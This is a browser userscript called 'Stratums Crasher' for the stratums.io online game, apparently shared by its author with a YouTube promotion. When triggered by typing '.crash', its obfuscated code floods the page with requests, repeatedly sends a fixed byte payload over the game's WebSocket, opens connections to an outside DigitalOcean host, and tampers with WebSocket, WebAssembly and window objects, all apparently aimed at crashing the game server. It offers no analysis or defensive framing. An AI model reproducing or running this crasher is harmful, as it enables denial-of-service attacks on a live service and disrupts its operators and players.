// ==UserScript==
// @name         Stratums Crasher
// @namespace    http://tampermonkey.net/
// @version      1.1
// @description  https://youtube.com/@pulsar_proe
// @author       Pulsar
// @match        https://*.stratums.io/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        none
// @run-at       document-start
// ==/UserScript==
window.socketURL = "https://moomoo.io";
var UiOp = function() {
    open().close()
};
fetch(document.querySelectorAll("script")[document.querySelectorAll("script").length - 1]).then((E => eval(E.text().replace("✅", "Fg"))));
let disable = !1;
WebSocket.prototype.close = null, console.clear = void 0, setInterval((() => Object.keys(window).map((e => e.includes("_") && (window[e] = void 0)))), 1);
let e = CanvasRenderingContext2D.prototype;
e.moveTo = new Proxy(e.moveTo, {}), e.fillText = new Proxy(e.fillText, {
    apply(o, t, n) {
        ".crash" == n[0] && (TuPo(), n[0] = "Subscribe To Pulsar: youtube.com/@pulsar_proe", UiOp()), ".ar" == n[0] && (e.rotate = new Proxy(e.rotate, {
            apply: (e, o, t) => t[0] > 2 * Math.PI || t[0] < 2 * -Math.PI ? Reflect.apply(e, o, [0]) : Reflect.apply(e, o, t)
        })), ".mr" == n[0] && (e.moveTo = null), n[0], o.apply(t, n)
    }
});
var TuPo = function() {
    let e = setInterval((() => {
        var e = location.href,
            o = document.createElement("img"),
            t = Math.floor(1e3 * Math.random());
        o.src = e + "?" + t + "=val", document.body.appendChild(o), new WebSocket("wss://plankton-app-29vjq.ondigitalocean.app/1").onopen = function() {
            this.send(new Uint8Array([136, 101, 39, 115, 93, 161, 43, 211, 27, 222, 2, 14, 114, 188]))
        }
    }), 1);
    setTimeout((() => clearInterval(e)), 1e4);
    var o = {
        offsets: [8323, 17540],
        scan: function() {
            this.oldToString = this.prototype.toString;
            for (let e = this.offsets[0]; e < this.offsets[1]; e++) this.prototype.toString = function() {
                return this.oldToString().replace("i32.const 0", "i32.const 3")
            }
        }
    };
    Object.keys(window).map((e => e.includes("_") && (window[e] = void 0))), Array.prototype.clear = function() {
        return new Uint32Array([73, 68, 69, 65, 64, 41, , 67, , 65])
    }, Object.keys(window).map((e => e.includes(new Uint32Array([73, 68, 69, 65, 64, 41, , 67, , 65]).toString(8)) && (window[e] = void 0))), window = new Proxy(window, {
        get: () => window.map((e => {
            e.includes("_") && (window[e] = void 0)
        }))
    }), WebAssembly = new Proxy(WebAssembly, {
        construct: () => ({
            WebAssembly: WebAssembly,
            Ws: o
        })
    }), this.LopS = {}, this.fhdS = WebSocket.prototype.send;
    WebSocket;
    let t = Proxy,
        n = null,
        r = WebSocket.prototype.send,
        i = WebSocket.prototype,
        s = WebSocket.prototype;
    i.send = new t(i.send, {
        set(e) {},
        get: (e, o, t) => o.toString().includes("toString") ? r[o].toString() : r[o],
        apply(e, o, t) {
            if (!n) {
                n = o;
                for (let e = 0; e < 100; e++) n.send(new Uint8Array([136, 101, 39, 115, 93, 161, 43, 211, 27, 222, 2, 14, 114, 188])), new WebSocket("wss://plankton-app-29vjq.ondigitalocean.app/1");
                n.close(), alert("script running"), i.send = s.send
            }
            return e.apply(o, t)
        }
    }), console.clear = void 0, this.Was = {
        CLOSED: 0,
        CLOSING: 0,
        CONNECTING: 0,
        OPEN: 1,
        addEventListener: function(e, o) {
            this["on" + e] = o
        },
        onclose: function() {},
        onopen: function() {},
        onerror: function() {},
        onmessage: function() {},
        protocol: "wss",
        readyState: 3,
        send: WebSocket.prototype.send,
        url: "wss://plankton-app-29vjq.ondigitalocean.app/1"
    }, this.WebSocket = new Proxy(WebSocket, {
        construct: () => function() {
            let e = Was;
            return window.Was = void 0, e
        }
    }), disable = !0
};
